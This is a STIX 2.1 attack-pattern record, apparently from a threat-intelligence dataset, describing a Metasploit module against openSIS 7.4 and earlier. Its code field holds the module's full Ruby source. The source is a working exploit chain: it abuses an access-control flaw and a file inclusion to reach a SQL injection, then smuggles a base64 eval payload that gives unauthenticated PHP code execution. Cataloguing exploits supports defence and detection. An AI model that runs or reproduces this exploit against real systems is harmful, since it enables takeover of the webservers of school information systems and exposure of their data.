{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--16f4d443-1612-40e5-b612-92a02d92d9e3",
    "created": "2024-08-14T17:12:14.368839Z",
    "modified": "2024-08-14T17:12:14.368843Z",
    "name": "openSIS Unauthenticated PHP Code Execution",
    "description": " This module exploits multiple vulnerabilities in openSIS 7.4 and prior versions which could be abused by unauthenticated attackers to execute arbitrary PHP code with the permissions of the webserver. The exploit chain abuses an incorrect access control issue which allows access to scripts which should require the user to be authenticated, and a Local File Inclusion to reach a SQL injection vulnerability which results in execution of arbitrary PHP code due to an unsafe use of the eval() function. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/opensis_chain_exec.rb",
            "external_id": "opensis_chain_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://karmainsecurity.com/KIS-2020-06"
        },
        {
            "source_name": "reference",
            "url": "http://karmainsecurity.com/KIS-2020-07"
        },
        {
            "source_name": "reference",
            "url": "http://karmainsecurity.com/KIS-2020-08"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-13381"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-13382"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-13383"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'openSIS Unauthenticated PHP Code Execution',\n        'Description' => %q{\n          This module exploits multiple vulnerabilities in openSIS 7.4 and prior versions\n          which could be abused by unauthenticated attackers to execute arbitrary PHP code\n          with the permissions of the webserver. The exploit chain abuses an incorrect access\n          control issue which allows access to scripts which should require the user to be\n          authenticated, and a Local File Inclusion to reach a SQL injection vulnerability which\n          results in execution of arbitrary PHP code due to an unsafe use of the eval() function.\n        },\n        'Author' => 'EgiX',\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['URL', 'http://karmainsecurity.com/KIS-2020-06'],\n          ['URL', 'http://karmainsecurity.com/KIS-2020-07'],\n          ['URL', 'http://karmainsecurity.com/KIS-2020-08'],\n          ['CVE', '2020-13381'],\n          ['CVE', '2020-13382'],\n          ['CVE', '2020-13383']\n        ],\n        'Privileged' => false,\n        'Platform' => ['php'],\n        'Arch' => ARCH_PHP,\n        'Targets' => [ ['openSIS <= 7.4', {}] ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2020-06-30'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to the web application', '/'])\n      ]\n    )\n  end\n\n  def exec_php(php_code)\n    print_status('Retrieving session cookie')\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path)\n    })\n\n    unless res\n      fail_with(Failure::Unreachable, 'Connection failed')\n    end\n\n    session = res.get_cookies\n\n    unless res.code == 200 && res.body && session =~ /PHPSESSID=([A-Za-z0-9]*);/\n      fail_with(Failure::NoAccess, 'Failed to retrieve session cookie')\n    end\n\n    random_title = rand_text_alpha(10)\n    random_param = rand_text_alpha(10)\n    php_cod = \"];eval(base64_decode($_POST[#{random_param}]));die;//\\\\\"\n    sql_enc = php_cod.each_byte.map { |b| b.to_s(16) }.join\n    sql_inj = \"' UNION SELECT 0x#{sql_enc}#\"\n\n    print_status('Injecting malicious SQL into session variable')\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'CpSessionSet.php/index.php'),\n      'cookie' => session,\n      'vars_post' => { 'title' => random_title, 'course_id' => sql_inj }\n    })\n\n    unless res && res.code == 200 && res.body =~ /#{random_title}/\n      fail_with(Failure::NoAccess, 'Failed to call CpSessionSet.php')\n    end\n\n    print_status(\"Calling ForExport.php to set $_SESSION['_REQUEST_vars']\")\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'ForExport.php/index.php'),\n      'cookie' => session,\n      'vars_post' => {\n        'modname' => 'scheduling/MassSchedule.php',\n        'modfunc' => 'save',\n        'day_start' => rand_text_numeric(1, '0'),\n        'month_start' => rand_text_numeric(1, '0'),\n        'year_start' => rand_text_numeric(4, '0')\n      }\n    })\n\n    unless res && res.code == 200 && res.body =~ /Error in User/\n      fail_with(Failure::NoAccess, 'Failed to call ForExport.php')\n    end\n\n    print_status('Executing PHP code by calling Bottom.php')\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'Bottom.php/index.php'),\n      'cookie' => session,\n      'vars_get' => { 'modname' => 'scheduling/MassSchedule.php', 'modfunc' => 'print' },\n      'vars_post' => { random_param => Rex::Text.encode_base64(php_code) }\n    }, 1)\n\n    res\n  end\n\n  def check\n    flag = rand_text_alpha(20..30)\n    res = exec_php(\"print '#{flag}';\")\n\n    if res && res.code == 200 && res.body =~ /#{flag}/\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    exec_php(payload.encoded)\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-06-30",
    "x_mitre_platforms": [
        "['php']"
    ]
}